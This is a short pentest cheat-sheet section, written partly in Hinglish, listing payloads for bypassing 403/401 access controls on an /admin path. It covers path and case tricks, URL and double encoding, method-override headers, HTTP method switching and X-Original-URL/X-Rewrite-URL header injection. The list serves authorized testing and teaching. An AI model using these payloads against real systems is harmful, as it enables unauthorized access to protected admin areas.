## 3. 403/401 Bypass тАФ Path & Method Based

**Path manipulation:**
`/admin/` try karo in variations mein:
`/admin/.` , `/admin//` , `/./admin/` , `/%2e/admin/`

**Case manipulation:**
`/Admin` , `/ADMIN` , `/AdMiN`

**Trailing characters:**
`/admin..;/` , `/admin/..;/` , `/admin%20` , `/admin%09`

**URL encoding:**
`/%61dmin` (where %61 = "a")

**Double encoding:**
`/%2561dmin`

**Method override headers:**
`X-HTTP-Method-Override: GET`
`X-HTTP-Method: PUT`
`X-Method-Override: DELETE`

**Method switching:**
Try `HEAD`, `OPTIONS`, `TRACE` instead of `GET`/`POST`

**Header injection:**
`X-Original-URL: /admin`
`X-Rewrite-URL: /admin`

